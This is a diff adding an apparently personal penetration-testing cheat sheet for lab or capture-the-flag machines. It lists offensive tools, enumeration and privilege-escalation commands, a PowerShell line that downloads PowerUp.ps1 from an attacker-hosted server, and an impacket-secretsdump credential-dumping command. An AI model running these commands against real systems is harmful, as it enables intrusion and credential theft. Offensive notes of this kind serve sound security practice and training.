@@ -1,0 +1,70 @@
+# Tools
+ # Windows
+    - kebrute       kerberos brueforcer
+    - icebreaker    AD expoloitation
+    - impacket      windows exploitation tools
+    - smbmap        lists smb shares
+
+ # Web
+    - Blindelephant     Web app and plugins identifier
+    - clusterd          Website fingerprinter
+    - Cutycapt          Screencaps a website
+    - Joomscan          Joomla scanner
+    - Commix            Command injection, web crawling
+    - cewl              Dump keywords from website
+    - greenwolf/spray   Username extractor
+
+ # Services
+    - autorecon     service enumerator
+
+ # Steg
+    - binwalk       Finds embedded files and code
+
+ # Crypto
+    - https://www.dcode.fr/multitap-abc-cipher
+    - https://www.boxentriq.com/code-breaking/cipher-identifier
+ # Misc
+    - googler       command line google
+
+# Enumeration
+ run enum4linux with all credentials
+ when guessing passwords try them on different services
+ check user accounts lastlogon to narrow down list
+ check the cert of the website
+
+# Shells
+    upgrade to pty      python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Network scanning
+ udp scan        udp-proto-scanner.pl -p ntp -f
+
+# Machines
+ # Foot hold
+  Home directories don't have to be in /home
+
+ # User
+  Find files owned by group               find / -group david 2>/dev/null
+  Find files owned by user                find / -user Matt 2>/dev/null | grep -v "/proc"
+  Find backup files                       find / -name "*.bak*" 2>/dev/null
+
+ # Root
+  FInd suid binaries                      find / -perm -u=s 2>/dev/null | grep -v snap
+                                          sudo -l
+  Check root processes                    ps -aux | grep root
+                                          ls -la /etc/cron.d
+  Check for binaries with non absolute paths
+
+
+ # Windows User
+  Get user info                           whoami /all
+  Downloading files                         powershell.exe -c Invoke-WebRequest -Uri http://10.10.14.2:8000/PowerUp.ps1 -OutFile powerup.ps1
+
+ # Windows Root
+  Dump secrets with impacket              impacket-secretsdump target -dc-ip $ip
+
+# Crypto
+ Search for keywords in text and crypto
+ Find the symbols language 
+ Find similar ciphers 
+ Try to do plaintext attack 
+ Subsitution cipher, word frequency, etc.
